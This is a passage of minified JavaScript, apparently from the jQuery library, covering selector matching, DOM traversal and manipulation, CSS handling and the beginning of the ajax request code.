c,e,f,g,h,i,j,k=b[1],l=a;switch(k){case"only":case"first":while(l=l.previousSibling)if(l.nodeType===1)return!1;if(k==="first")return!0;l=a;case"last":while(l=l.nextSibling)if(l.nodeType===1)return!1;return!0;case"nth":c=b[2],e=b[3];if(c===1&&e===0)return!0;f=b[0],g=a.parentNode;if(g&&(g[d]!==f||!a.nodeIndex)){i=0;for(l=g.firstChild;l;l=l.nextSibling)l.nodeType===1&&(l.nodeIndex=++i);g[d]=f}j=a.nodeIndex-e;return c===0?j===0:j%c===0&&j/c>=0}},ID:function(a,b){return a.nodeType===1&&a.getAttribute("id")===b},TAG:function(a,b){return b==="*"&&a.nodeType===1||!!a.nodeName&&a.nodeName.toLowerCase()===b},CLASS:function(a,b){return(" "+(a.className||a.getAttribute("class"))+" ").indexOf(b)>-1},ATTR:function(a,b){var c=b[1],d=m.attr?m.attr(a,c):o.attrHandle[c]?o.attrHandle[c](a):a[c]!=null?a[c]:a.getAttribute(c),e=d+"",f=b[2],g=b[4];return d==null?f==="!=":!f&&m.attr?d!=null:f==="="?e===g:f==="*="?e.indexOf(g)>=0:f==="~="?(" "+e+" ").indexOf(g)>=0:g?f==="!="?e!==g:f==="^="?e.indexOf(g)===0:f==="$="?e.substr(e.length-g.length)===g:f==="|="?e===g||e.substr(0,g.length+1)===g+"-":!1:e&&d!==!1},POS:function(a,b,c,d){var e=b[2],f=o.setFilters[e];if(f)return f(a,c,b,d)}}},p=o.match.POS,q=function(a,b){return"\\"+(b-0+1)};for(var r in o.match)o.match[r]=new RegExp(o.match[r].source+/(?![^\[]*\])(?![^\(]*\))/.source),o.leftMatch[r]=new RegExp(/(^(?:.|\r|\n)*?)/.source+o.match[r].source.replace(/\\(\d+)/g,q));var s=function(a,b){a=Array.prototype.slice.call(a,0);if(b){b.push.apply(b,a);return b}return a};try{Array.prototype.slice.call(c.documentElement.childNodes,0)[0].nodeType}catch(t){s=function(a,b){var c=0,d=b||[];if(g.call(a)==="[object Array]")Array.prototype.push.apply(d,a);else if(typeof a.length=="number")for(var e=a.length;c<e;c++)d.push(a[c]);else for(;a[c];c++)d.push(a[c]);return d}}var u,v;c.documentElement.compareDocumentPosition?u=function(a,b){if(a===b){h=!0;return 0}if(!a.compareDocumentPosition||!b.compareDocumentPosition)return a.compareDocumentPosition?-1:1;return a.compareDocumentPosition(b)&4?-1:1}:(u=function(a,b){if(a===b){h=!0;return 0}if(a.sourceIndex&&b.sourceIndex)return a.sourceIndex-b.sourceIndex;var c,d,e=[],f=[],g=a.parentNode,i=b.parentNode,j=g;if(g===i)return v(a,b);if(!g)return-1;if(!i)return 1;while(j)e.unshift(j),j=j.parentNode;j=i;while(j)f.unshift(j),j=j.parentNode;c=e.length,d=f.length;for(var k=0;k<c&&k<d;k++)if(e[k]!==f[k])return v(e[k],f[k]);return k===c?v(a,f[k],-1):v(e[k],b,1)},v=function(a,b,c){if(a===b)return c;var d=a.nextSibling;while(d){if(d===b)return-1;d=d.nextSibling}return 1}),function(){var a=c.createElement("div"),d="script"+(new Date).getTime(),e=c.documentElement;a.innerHTML="<a name='"+d+"'/>",e.insertBefore(a,e.firstChild),c.getElementById(d)&&(o.find.ID=function(a,c,d){if(typeof c.getElementById!="undefined"&&!d){var e=c.getElementById(a[1]);return e?e.id===a[1]||typeof e.getAttributeNode!="undefined"&&e.getAttributeNode("id").nodeValue===a[1]?[e]:b:[]}},o.filter.ID=function(a,b){var c=typeof a.getAttributeNode!="undefined"&&a.getAttributeNode("id");return a.nodeType===1&&c&&c.nodeValue===b}),e.removeChild(a),e=a=null}(),function(){var a=c.createElement("div");a.appendChild(c.createComment("")),a.getElementsByTagName("*").length>0&&(o.find.TAG=function(a,b){var c=b.getElementsByTagName(a[1]);if(a[1]==="*"){var d=[];for(var e=0;c[e];e++)c[e].nodeType===1&&d.push(c[e]);c=d}return c}),a.innerHTML="<a href='#'></a>",a.firstChild&&typeof a.firstChild.getAttribute!="undefined"&&a.firstChild.getAttribute("href")!=="#"&&(o.attrHandle.href=function(a){return a.getAttribute("href",2)}),a=null}(),c.querySelectorAll&&function(){var a=m,b=c.createElement("div"),d="__sizzle__";b.innerHTML="<p class='TEST'></p>";if(!b.querySelectorAll||b.querySelectorAll(".TEST").length!==0){m=function(b,e,f,g){e=e||c;if(!g&&!m.isXML(e)){var h=/^(\w+$)|^\.([\w\-]+$)|^#([\w\-]+$)/.exec(b);if(h&&(e.nodeType===1||e.nodeType===9)){if(h[1])return s(e.getElementsByTagName(b),f);if(h[2]&&o.find.CLASS&&e.getElementsByClassName)return s(e.getElementsByClassName(h[2]),f)}if(e.nodeType===9){if(b==="body"&&e.body)return s([e.body],f);if(h&&h[3]){var i=e.getElementById(h[3]);if(!i||!i.parentNode)return s([],f);if(i.id===h[3])return s([i],f)}try{return s(e.querySelectorAll(b),f)}catch(j){}}else if(e.nodeType===1&&e.nodeName.toLowerCase()!=="object"){var k=e,l=e.getAttribute("id"),n=l||d,p=e.parentNode,q=/^\s*[+~]/.test(b);l?n=n.replace(/'/g,"\\$&"):e.setAttribute("id",n),q&&p&&(e=e.parentNode);try{if(!q||p)return s(e.querySelectorAll("[id='"+n+"'] "+b),f)}catch(r){}finally{l||k.removeAttribute("id")}}}return a(b,e,f,g)};for(var e in a)m[e]=a[e];b=null}}(),function(){var a=c.documentElement,b=a.matchesSelector||a.mozMatchesSelector||a.webkitMatchesSelector||a.msMatchesSelector;if(b){var d=!b.call(c.createElement("div"),"div"),e=!1;try{b.call(c.documentElement,"[test!='']:sizzle")}catch(f){e=!0}m.matchesSelector=function(a,c){c=c.replace(/\=\s*([^'"\]]*)\s*\]/g,"='$1']");if(!m.isXML(a))try{if(e||!o.match.PSEUDO.test(c)&&!/!=/.test(c)){var f=b.call(a,c);if(f||!d||a.document&&a.document.nodeType!==11)return f}}catch(g){}return m(c,null,null,[a]).length>0}}}(),function(){var a=c.createElement("div");a.innerHTML="<div class='test e'></div><div class='test'></div>";if(!!a.getElementsByClassName&&a.getElementsByClassName("e").length!==0){a.lastChild.className="e";if(a.getElementsByClassName("e").length===1)return;o.order.splice(1,0,"CLASS"),o.find.CLASS=function(a,b,c){if(typeof b.getElementsByClassName!="undefined"&&!c)return b.getElementsByClassName(a[1])},a=null}}(),c.documentElement.contains?m.contains=function(a,b){return a!==b&&(a.contains?a.contains(b):!0)}:c.documentElement.compareDocumentPosition?m.contains=function(a,b){return!!(a.compareDocumentPosition(b)&16)}:m.contains=function(){return!1},m.isXML=function(a){var b=(a?a.ownerDocument||a:0).documentElement;return b?b.nodeName!=="HTML":!1};var y=function(a,b,c){var d,e=[],f="",g=b.nodeType?[b]:b;while(d=o.match.PSEUDO.exec(a))f+=d[0],a=a.replace(o.match.PSEUDO,"");a=o.relative[a]?a+"*":a;for(var h=0,i=g.length;h<i;h++)m(a,g[h],e,c);return m.filter(f,e)};m.attr=f.attr,m.selectors.attrMap={},f.find=m,f.expr=m.selectors,f.expr[":"]=f.expr.filters,f.unique=m.uniqueSort,f.text=m.getText,f.isXMLDoc=m.isXML,f.contains=m.contains}();var L=/Until$/,M=/^(?:parents|prevUntil|prevAll)/,N=/,/,O=/^.[^:#\[\.,]*$/,P=Array.prototype.slice,Q=f.expr.match.POS,R={children:!0,contents:!0,next:!0,prev:!0};f.fn.extend({find:function(a){var b=this,c,d;if(typeof a!="string")return f(a).filter(function(){for(c=0,d=b.length;c<d;c++)if(f.contains(b[c],this))return!0});var e=this.pushStack("","find",a),g,h,i;for(c=0,d=this.length;c<d;c++){g=e.length,f.find(a,this[c],e);if(c>0)for(h=g;h<e.length;h++)for(i=0;i<g;i++)if(e[i]===e[h]){e.splice(h--,1);break}}return e},has:function(a){var b=f(a);return this.filter(function(){for(var a=0,c=b.length;a<c;a++)if(f.contains(this,b[a]))return!0})},not:function(a){return this.pushStack(T(this,a,!1),"not",a)},filter:function(a){return this.pushStack(T(this,a,!0),"filter",a)},is:function(a){return!!a&&(typeof a=="string"?Q.test(a)?f(a,this.context).index(this[0])>=0:f.filter(a,this).length>0:this.filter(a).length>0)},closest:function(a,b){var c=[],d,e,g=this[0];if(f.isArray(a)){var h=1;while(g&&g.ownerDocument&&g!==b){for(d=0;d<a.length;d++)f(g).is(a[d])&&c.push({selector:a[d],elem:g,level:h});g=g.parentNode,h++}return c}var i=Q.test(a)||typeof a!="string"?f(a,b||this.context):0;for(d=0,e=this.length;d<e;d++){g=this[d];while(g){if(i?i.index(g)>-1:f.find.matchesSelector(g,a)){c.push(g);break}g=g.parentNode;if(!g||!g.ownerDocument||g===b||g.nodeType===11)break}}c=c.length>1?f.unique(c):c;return this.pushStack(c,"closest",a)},index:function(a){if(!a)return this[0]&&this[0].parentNode?this.prevAll().length:-1;if(typeof a=="string")return f.inArray(this[0],f(a));return f.inArray(a.jquery?a[0]:a,this)},add:function(a,b){var c=typeof a=="string"?f(a,b):f.makeArray(a&&a.nodeType?[a]:a),d=f.merge(this.get(),c);return this.pushStack(S(c[0])||S(d[0])?d:f.unique(d))},andSelf:function(){return this.add(this.prevObject)}}),f.each({parent:function(a){var b=a.parentNode;return b&&b.nodeType!==11?b:null},parents:function(a){return f.dir(a,"parentNode")},parentsUntil:function(a,b,c){return f.dir(a,"parentNode",c)},next:function(a){return f.nth(a,2,"nextSibling")},prev:function(a){return f.nth(a,2,"previousSibling")},nextAll:function(a){return f.dir(a,"nextSibling")},prevAll:function(a){return f.dir(a,"previousSibling")},nextUntil:function(a,b,c){return f.dir(a,"nextSibling",c)},prevUntil:function(a,b,c){return f.dir(a,"previousSibling",c)},siblings:function(a){return f.sibling(a.parentNode.firstChild,a)},children:function(a){return f.sibling(a.firstChild)},contents:function(a){return f.nodeName(a,"iframe")?a.contentDocument||a.contentWindow.document:f.makeArray(a.childNodes)}},function(a,b){f.fn[a]=function(c,d){var e=f.map(this,b,c);L.test(a)||(d=c),d&&typeof d=="string"&&(e=f.filter(d,e)),e=this.length>1&&!R[a]?f.unique(e):e,(this.length>1||N.test(d))&&M.test(a)&&(e=e.reverse());return this.pushStack(e,a,P.call(arguments).join(","))}}),f.extend({filter:function(a,b,c){c&&(a=":not("+a+")");return b.length===1?f.find.matchesSelector(b[0],a)?[b[0]]:[]:f.find.matches(a,b)},dir:function(a,c,d){var e=[],g=a[c];while(g&&g.nodeType!==9&&(d===b||g.nodeType!==1||!f(g).is(d)))g.nodeType===1&&e.push(g),g=g[c];return e},nth:function(a,b,c,d){b=b||1;var e=0;for(;a;a=a[c])if(a.nodeType===1&&++e===b)break;return a},sibling:function(a,b){var c=[];for(;a;a=a.nextSibling)a.nodeType===1&&a!==b&&c.push(a);return c}});var V="abbr|article|aside|audio|canvas|datalist|details|figcaption|figure|footer|header|hgroup|mark|meter|nav|output|progress|section|summary|time|video",W=/ jQuery\d+="(?:\d+|null)"/g,X=/^\s+/,Y=/<(?!area|br|col|embed|hr|img|input|link|meta|param)(([\w:]+)[^>]*)\/>/ig,Z=/<([\w:]+)/,$=/<tbody/i,_=/<|&#?\w+;/,ba=/<(?:script|style)/i,bb=/<(?:script|object|embed|option|style)/i,bc=new RegExp("<(?:"+V+")","i"),bd=/checked\s*(?:[^=]|=\s*.checked.)/i,be=/\/(java|ecma)script/i,bf=/^\s*<!(?:\[CDATA\[|\-\-)/,bg={option:[1,"<select multiple='multiple'>","</select>"],legend:[1,"<fieldset>","</fieldset>"],thead:[1,"<table>","</table>"],tr:[2,"<table><tbody>","</tbody></table>"],td:[3,"<table><tbody><tr>","</tr></tbody></table>"],col:[2,"<table><tbody></tbody><colgroup>","</colgroup></table>"],area:[1,"<map>","</map>"],_default:[0,"",""]},bh=U(c);bg.optgroup=bg.option,bg.tbody=bg.tfoot=bg.colgroup=bg.caption=bg.thead,bg.th=bg.td,f.support.htmlSerialize||(bg._default=[1,"div<div>","</div>"]),f.fn.extend({text:function(a){if(f.isFunction(a))return this.each(function(b){var c=f(this);c.text(a.call(this,b,c.text()))});if(typeof a!="object"&&a!==b)return this.empty().append((this[0]&&this[0].ownerDocument||c).createTextNode(a));return f.text(this)},wrapAll:function(a){if(f.isFunction(a))return this.each(function(b){f(this).wrapAll(a.call(this,b))});if(this[0]){var b=f(a,this[0].ownerDocument).eq(0).clone(!0);this[0].parentNode&&b.insertBefore(this[0]),b.map(function(){var a=this;while(a.firstChild&&a.firstChild.nodeType===1)a=a.firstChild;return a}).append(this)}return this},wrapInner:function(a){if(f.isFunction(a))return this.each(function(b){f(this).wrapInner(a.call(this,b))});return this.each(function(){var b=f(this),c=b.contents();c.length?c.wrapAll(a):b.append(a)})},wrap:function(a){var b=f.isFunction(a);return this.each(function(c){f(this).wrapAll(b?a.call(this,c):a)})},unwrap:function(){return this.parent().each(function(){f.nodeName(this,"body")||f(this).replaceWith(this.childNodes)}).end()},append:function(){return this.domManip(arguments,!0,function(a){this.nodeType===1&&this.appendChild(a)})},prepend:function(){return this.domManip(arguments,!0,function(a){this.nodeType===1&&this.insertBefore(a,this.firstChild)})},before:function(){if(this[0]&&this[0].parentNode)return this.domManip(arguments,!1,function(a){this.parentNode.insertBefore(a,this)});if(arguments.length){var a=f.clean(arguments);a.push.apply(a,this.toArray());return this.pushStack(a,"before",arguments)}},after:function(){if(this[0]&&this[0].parentNode)return this.domManip(arguments,!1,function(a){this.parentNode.insertBefore(a,this.nextSibling)});if(arguments.length){var a=this.pushStack(this,"after",arguments);a.push.apply(a,f.clean(arguments));return a}},remove:function(a,b){for(var c=0,d;(d=this[c])!=null;c++)if(!a||f.filter(a,[d]).length)!b&&d.nodeType===1&&(f.cleanData(d.getElementsByTagName("*")),f.cleanData([d])),d.parentNode&&d.parentNode.removeChild(d);return this},empty:function()
                    {for(var a=0,b;(b=this[a])!=null;a++){b.nodeType===1&&f.cleanData(b.getElementsByTagName("*"));while(b.firstChild)b.removeChild(b.firstChild)}return this},clone:function(a,b){a=a==null?!1:a,b=b==null?a:b;return this.map(function(){return f.clone(this,a,b)})},html:function(a){if(a===b)return this[0]&&this[0].nodeType===1?this[0].innerHTML.replace(W,""):null;if(typeof a=="string"&&!ba.test(a)&&(f.support.leadingWhitespace||!X.test(a))&&!bg[(Z.exec(a)||["",""])[1].toLowerCase()]){a=a.replace(Y,"<$1></$2>");try{for(var c=0,d=this.length;c<d;c++)this[c].nodeType===1&&(f.cleanData(this[c].getElementsByTagName("*")),this[c].innerHTML=a)}catch(e){this.empty().append(a)}}else f.isFunction(a)?this.each(function(b){var c=f(this);c.html(a.call(this,b,c.html()))}):this.empty().append(a);return this},replaceWith:function(a){if(this[0]&&this[0].parentNode){if(f.isFunction(a))return this.each(function(b){var c=f(this),d=c.html();c.replaceWith(a.call(this,b,d))});typeof a!="string"&&(a=f(a).detach());return this.each(function(){var b=this.nextSibling,c=this.parentNode;f(this).remove(),b?f(b).before(a):f(c).append(a)})}return this.length?this.pushStack(f(f.isFunction(a)?a():a),"replaceWith",a):this},detach:function(a){return this.remove(a,!0)},domManip:function(a,c,d){var e,g,h,i,j=a[0],k=[];if(!f.support.checkClone&&arguments.length===3&&typeof j=="string"&&bd.test(j))return this.each(function(){f(this).domManip(a,c,d,!0)});if(f.isFunction(j))return this.each(function(e){var g=f(this);a[0]=j.call(this,e,c?g.html():b),g.domManip(a,c,d)});if(this[0]){i=j&&j.parentNode,f.support.parentNode&&i&&i.nodeType===11&&i.childNodes.length===this.length?e={fragment:i}:e=f.buildFragment(a,this,k),h=e.fragment,h.childNodes.length===1?g=h=h.firstChild:g=h.firstChild;if(g){c=c&&f.nodeName(g,"tr");for(var l=0,m=this.length,n=m-1;l<m;l++)d.call(c?bi(this[l],g):this[l],e.cacheable||m>1&&l<n?f.clone(h,!0,!0):h)}k.length&&f.each(k,bp)}return this}}),f.buildFragment=function(a,b,d){var e,g,h,i,j=a[0];b&&b[0]&&(i=b[0].ownerDocument||b[0]),i.createDocumentFragment||(i=c),a.length===1&&typeof j=="string"&&j.length<512&&i===c&&j.charAt(0)==="<"&&!bb.test(j)&&(f.support.checkClone||!bd.test(j))&&(f.support.html5Clone||!bc.test(j))&&(g=!0,h=f.fragments[j],h&&h!==1&&(e=h)),e||(e=i.createDocumentFragment(),f.clean(a,i,e,d)),g&&(f.fragments[j]=h?e:1);return{fragment:e,cacheable:g}},f.fragments={},f.each({appendTo:"append",prependTo:"prepend",insertBefore:"before",insertAfter:"after",replaceAll:"replaceWith"},function(a,b){f.fn[a]=function(c){var d=[],e=f(c),g=this.length===1&&this[0].parentNode;if(g&&g.nodeType===11&&g.childNodes.length===1&&e.length===1){e[b](this[0]);return this}for(var h=0,i=e.length;h<i;h++){var j=(h>0?this.clone(!0):this).get();f(e[h])[b](j),d=d.concat(j)}return this.pushStack(d,a,e.selector)}}),f.extend({clone:function(a,b,c){var d,e,g,h=f.support.html5Clone||!bc.test("<"+a.nodeName)?a.cloneNode(!0):bo(a);if((!f.support.noCloneEvent||!f.support.noCloneChecked)&&(a.nodeType===1||a.nodeType===11)&&!f.isXMLDoc(a)){bk(a,h),d=bl(a),e=bl(h);for(g=0;d[g];++g)e[g]&&bk(d[g],e[g])}if(b){bj(a,h);if(c){d=bl(a),e=bl(h);for(g=0;d[g];++g)bj(d[g],e[g])}}d=e=null;return h},clean:function(a,b,d,e){var g;b=b||c,typeof b.createElement=="undefined"&&(b=b.ownerDocument||b[0]&&b[0].ownerDocument||c);var h=[],i;for(var j=0,k;(k=a[j])!=null;j++){typeof k=="number"&&(k+="");if(!k)continue;if(typeof k=="string")if(!_.test(k))k=b.createTextNode(k);else{k=k.replace(Y,"<$1></$2>");var l=(Z.exec(k)||["",""])[1].toLowerCase(),m=bg[l]||bg._default,n=m[0],o=b.createElement("div");b===c?bh.appendChild(o):U(b).appendChild(o),o.innerHTML=m[1]+k+m[2];while(n--)o=o.lastChild;if(!f.support.tbody){var p=$.test(k),q=l==="table"&&!p?o.firstChild&&o.firstChild.childNodes:m[1]==="<table>"&&!p?o.childNodes:[];for(i=q.length-1;i>=0;--i)f.nodeName(q[i],"tbody")&&!q[i].childNodes.length&&q[i].parentNode.removeChild(q[i])}!f.support.leadingWhitespace&&X.test(k)&&o.insertBefore(b.createTextNode(X.exec(k)[0]),o.firstChild),k=o.childNodes}var r;if(!f.support.appendChecked)if(k[0]&&typeof (r=k.length)=="number")for(i=0;i<r;i++)bn(k[i]);else bn(k);k.nodeType?h.push(k):h=f.merge(h,k)}if(d){g=function(a){return!a.type||be.test(a.type)};for(j=0;h[j];j++)if(e&&f.nodeName(h[j],"script")&&(!h[j].type||h[j].type.toLowerCase()==="text/javascript"))e.push(h[j].parentNode?h[j].parentNode.removeChild(h[j]):h[j]);else{if(h[j].nodeType===1){var s=f.grep(h[j].getElementsByTagName("script"),g);h.splice.apply(h,[j+1,0].concat(s))}d.appendChild(h[j])}}return h},cleanData:function(a){var b,c,d=f.cache,e=f.event.special,g=f.support.deleteExpando;for(var h=0,i;(i=a[h])!=null;h++){if(i.nodeName&&f.noData[i.nodeName.toLowerCase()])continue;c=i[f.expando];if(c){b=d[c];if(b&&b.events){for(var j in b.events)e[j]?f.event.remove(i,j):f.removeEvent(i,j,b.handle);b.handle&&(b.handle.elem=null)}g?delete i[f.expando]:i.removeAttribute&&i.removeAttribute(f.expando),delete d[c]}}}});var bq=/alpha\([^)]*\)/i,br=/opacity=([^)]*)/,bs=/([A-Z]|^ms)/g,bt=/^-?\d+(?:px)?$/i,bu=/^-?\d/,bv=/^([\-+])=([\-+.\de]+)/,bw={position:"absolute",visibility:"hidden",display:"block"},bx=["Left","Right"],by=["Top","Bottom"],bz,bA,bB;f.fn.css=function(a,c){if(arguments.length===2&&c===b)return this;return f.access(this,a,c,!0,function(a,c,d){return d!==b?f.style(a,c,d):f.css(a,c)})},f.extend({cssHooks:{opacity:{get:function(a,b){if(b){var c=bz(a,"opacity","opacity");return c===""?"1":c}return a.style.opacity}}},cssNumber:{fillOpacity:!0,fontWeight:!0,lineHeight:!0,opacity:!0,orphans:!0,widows:!0,zIndex:!0,zoom:!0},cssProps:{"float":f.support.cssFloat?"cssFloat":"styleFloat"},style:function(a,c,d,e){if(!!a&&a.nodeType!==3&&a.nodeType!==8&&!!a.style){var g,h,i=f.camelCase(c),j=a.style,k=f.cssHooks[i];c=f.cssProps[i]||i;if(d===b){if(k&&"get"in k&&(g=k.get(a,!1,e))!==b)return g;return j[c]}h=typeof d,h==="string"&&(g=bv.exec(d))&&(d=+(g[1]+1)*+g[2]+parseFloat(f.css(a,c)),h="number");if(d==null||h==="number"&&isNaN(d))return;h==="number"&&!f.cssNumber[i]&&(d+="px");if(!k||!("set"in k)||(d=k.set(a,d))!==b)try{j[c]=d}catch(l){}}},css:function(a,c,d){var e,g;c=f.camelCase(c),g=f.cssHooks[c],c=f.cssProps[c]||c,c==="cssFloat"&&(c="float");if(g&&"get"in g&&(e=g.get(a,!0,d))!==b)return e;if(bz)return bz(a,c)},swap:function(a,b,c){var d={};for(var e in b)d[e]=a.style[e],a.style[e]=b[e];c.call(a);for(e in b)a.style[e]=d[e]}}),f.curCSS=f.css,f.each(["height","width"],function(a,b){f.cssHooks[b]={get:function(a,c,d){var e;if(c){if(a.offsetWidth!==0)return bC(a,b,d);f.swap(a,bw,function(){e=bC(a,b,d)});return e}},set:function(a,b){if(!bt.test(b))return b;b=parseFloat(b);if(b>=0)return b+"px"}}}),f.support.opacity||(f.cssHooks.opacity={get:function(a,b){return br.test((b&&a.currentStyle?a.currentStyle.filter:a.style.filter)||"")?parseFloat(RegExp.$1)/100+"":b?"1":""},set:function(a,b){var c=a.style,d=a.currentStyle,e=f.isNumeric(b)?"alpha(opacity="+b*100+")":"",g=d&&d.filter||c.filter||"";c.zoom=1;if(b>=1&&f.trim(g.replace(bq,""))===""){c.removeAttribute("filter");if(d&&!d.filter)return}c.filter=bq.test(g)?g.replace(bq,e):g+" "+e}}),f(function(){f.support.reliableMarginRight||(f.cssHooks.marginRight={get:function(a,b){var c;f.swap(a,{display:"inline-block"},function(){b?c=bz(a,"margin-right","marginRight"):c=a.style.marginRight});return c}})}),c.defaultView&&c.defaultView.getComputedStyle&&(bA=function(a,b){var c,d,e;b=b.replace(bs,"-$1").toLowerCase(),(d=a.ownerDocument.defaultView)&&(e=d.getComputedStyle(a,null))&&(c=e.getPropertyValue(b),c===""&&!f.contains(a.ownerDocument.documentElement,a)&&(c=f.style(a,b)));return c}),c.documentElement.currentStyle&&(bB=function(a,b){var c,d,e,f=a.currentStyle&&a.currentStyle[b],g=a.style;f===null&&g&&(e=g[b])&&(f=e),!bt.test(f)&&bu.test(f)&&(c=g.left,d=a.runtimeStyle&&a.runtimeStyle.left,d&&(a.runtimeStyle.left=a.currentStyle.left),g.left=b==="fontSize"?"1em":f||0,f=g.pixelLeft+"px",g.left=c,d&&(a.runtimeStyle.left=d));return f===""?"auto":f}),bz=bA||bB,f.expr&&f.expr.filters&&(f.expr.filters.hidden=function(a){var b=a.offsetWidth,c=a.offsetHeight;return b===0&&c===0||!f.support.reliableHiddenOffsets&&(a.style&&a.style.display||f.css(a,"display"))==="none"},f.expr.filters.visible=function(a){return!f.expr.filters.hidden(a)});var bD=/%20/g,bE=/\[\]$/,bF=/\r?\n/g,bG=/#.*$/,bH=/^(.*?):[ \t]*([^\r\n]*)\r?$/mg,bI=/^(?:color|date|datetime|datetime-local|email|hidden|month|number|password|range|search|tel|text|time|url|week)$/i,bJ=/^(?:about|app|app\-storage|.+\-extension|file|res|widget):$/,bK=/^(?:GET|HEAD)$/,bL=/^\/\//,bM=/\?/,bN=/<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi,bO=/^(?:select|textarea)/i,bP=/\s+/,bQ=/([?&])_=[^&]*/,bR=/^([\w\+\.\-]+:)(?:\/\/([^\/?#:]*)(?::(\d+))?)?/,bS=f.fn.load,bT={},bU={},bV,bW,bX=["*/"]+["*"];try{bV=e.href}catch(bY){bV=c.createElement("a"),bV.href="",bV=bV.href}bW=bR.exec(bV.toLowerCase())||[],f.fn.extend({load:function(a,c,d){if(typeof a!="string"&&bS)return bS.apply(this,arguments);if(!this.length)return this;var e=a.indexOf(" ");if(e>=0){var g=a.slice(e,a.length);a=a.slice(0,e)}var h="GET";c&&(f.isFunction(c)?(d=c,c=b):typeof c=="object"&&(c=f.param(c,f.ajaxSettings.traditional),h="POST"));var i=this;f.ajax({url:a,type:h,dataType:"html",data:c,complete:function(a,b,c){c=a.responseText,a.isResolved()&&(a.done(function(a){c=a}),i.html(g?f("<div>").append(c.replace(bN,"")).find(g):c)),d&&i.each(d,[c,b,a])}});return this},serialize:function(){return f.param(this.serializeArray())},serializeArray:function(){return this.map(function(){return this.elements?f.makeArray(this.elements):this}).filter(function(){return this.name&&!this.disabled&&(this.checked||bO.test(this.nodeName)||bI.test(this.type))}).map(function(a,b){var c=f(this).val();return c==null?null:f.isArray(c)?f.map(c,function(a,c){return{name:b.name,value:a.replace(bF,"\r\n")}}):{name:b.name,value:c.replace(bF,"\r\n")}}).get()}}),f.each("ajaxStart ajaxStop ajaxComplete ajaxError ajaxSuccess ajaxSend".split(" "),function(a,b){f.fn[b]=function(a){return this.on(b,a)}}),f.each(["get","post"],function(a,c){f[c]=function(a,d,e,g){f.isFunction(d)&&(g=g||e,e=d,d=b);return f.ajax({type:c,url:a,data:d,success:e,dataType:g})}}),f.extend({getScript:function(a,c){return f.get(a,b,c,"script")},getJSON:function(a,b,c){return f.get(a,b,c,"json")},ajaxSetup:function(a,b){b?b_(a,f.ajaxSettings):(b=a,a=f.ajaxSettings),b_(a,b);return a},ajaxSettings:{url:bV,isLocal:bJ.test(bW[1]),global:!0,type:"GET",contentType:"application/x-www-form-urlencoded",processData:!0,async:!0,accepts:{xml:"application/xml, text/xml",html:"text/html",text:"text/plain",json:"application/json, text/javascript","*":bX},contents:{xml:/xml/,html:/html/,json:/json/},responseFields:{xml:"responseXML",text:"responseText"},converters:{"* text":a.String,"text html":!0,"text json":f.parseJSON,"text xml":f.parseXML},flatOptions:{context:!0,url:!0}},ajaxPrefilter:bZ(bT),ajaxTransport:bZ(bU),ajax:function(a,c){function w(a,c,l,m){if(s!==2){s=2,q&&clearTimeout(q),p=b,n=m||"",v.readyState=a>0?4:0;var o,r,u,w=c,x=l?cb(d,v,l):b,y,z;if(a>=200&&a<300||a===304){if(d.ifModified){if(y=v.getResponseHeader("Last-Modified"))f.lastModified[k]=y;if(z=v.getResponseHeader("Etag"))f.etag[k]=z}if(a===304)w="notmodified",o=!0;else try{r=cc(d,x),w="success",o=!0}catch(A){w="parsererror",u=A}}else{u=w;if(!w||a)w="error",a<0&&(a=0)}v.status=a,v.statusText=""+(c||w),o?h.resolveWith(e,[r,w,v]):h.rejectWith(e,[v,w,u]),v.statusCode(j),j=b,t&&g.trigger("ajax"+(o?"Success":"Error"),[v,d,o?r:u]),i.fireWith(e,[v,w]),t&&(g.trigger("ajaxComplete",[v,d]),--f.active||f.event.trigger("ajaxStop"))}}typeof a=="object"&&(c=a,a=b),c=c||{};var d=f.ajaxSetup({},c),e=d.context||d,g=e!==d&&(e.nodeType||e instanceof f)?f(e):f.event,h=f.Deferred(),i=f.Callbacks("once memory"),j=d.statusCode||{},k,l={},m={},n,o,p,q,r,s=0,t,u,v={readyState:0,setRequestHeader:function(a,b){if(!s){var c=a.toLowerCase();a=m[c]=m[c]||a,l[a]=b}return this},getAllResponseHeaders:function(){return s===2?n:null},getResponseHeader:function(a){var c;if(s===2){if(!o){o={};while(c=bH.exec(n))o[c[1].toLowerCase()]=c[2]}c=o[a.toLowerCase()]}return c===b?null:c},overrideMimeType:function(a){s||(d.mimeType=a);return this},abort:function(a){a=a||"abort",p&&p.abort(a),w(0,a);return this}};h.promise(v),v.success=v.done,v.error=v.fail,v.complete=i.add,v.statusCode=function(a){if(a){var b;if(s<2)for(b in a)j[b]=[j[b],a[b]];else b=a[v.status],v.then(b,b)}return this},d.url=((a||d.url)+"").replace(bG,"").replace(bL,bW[1]+"//"),d.dataTypes=f.trim(d.dataType||"*").toLowerCase().split(bP),d.crossDomain==null&&(r=bR.exec(d.url.toLowerCase()),d.crossDomain=!(!r||r[1]==bW[1]&&r[2]==bW[2]&&(r[3]||(r[1]==="http:"?80:443))==(bW[3]||(bW[1]==="http:"?80:443)))),d.data&&d.processData&&typeof d.data!="string"&&(d.data=f.param(d.data,d.traditional)),b$(bT,d,c,v);if(s===2)return!1;t=d.global,d.type=d.type.toUpperCase(),d.hasContent=!bK.test(d.type),t&&f.active++===0&&f.event.trigger("ajaxStart");if(!d.hasContent){d.data&&(d.url+=(bM.test(d.url)?"&":"?")+d.data,delete d.data),k=d.url;if(d.cache===!1){var x=f.now(),y=d.url.replace(bQ,"$1_="+x);d.url=y+(y===d.url?(bM.test(d.url)?"&":"?")+"_="+x:"")}}(d.data&&d.hasContent&&d.contentType!==!1||c.contentType)&&v.setRequestHeader("Content-Type",d.contentType),d.ifModified&&(k=k||d.url,f.lastModified[k]&&v.setRequestHeader("If-Modified-Since",f.lastModified[k]),f.etag[k]&&v.setRequestHeader("If-None-Match",f.etag[k])),v.setRequestHeader("Accept",d.dataTypes[0]&&d.accepts[d.dataTypes[0]]?d.accepts[d.dataTypes[0]]+(d.dataTypes[0]!=="*"?", "+bX+"; q=0.01":""):d.accepts["*"]);for(u in d.headers)v.setRequestHeader(u,d.headers[u]);if(d.beforeSend&&(d.beforeSend.call(e,v,d)===!1||s===2)){v.abort();return!1}for(u in{success:1,error:1,complete:1})v[u](d[u]);p=b$(bU,d,c,v);if(!p)w(-1,"No 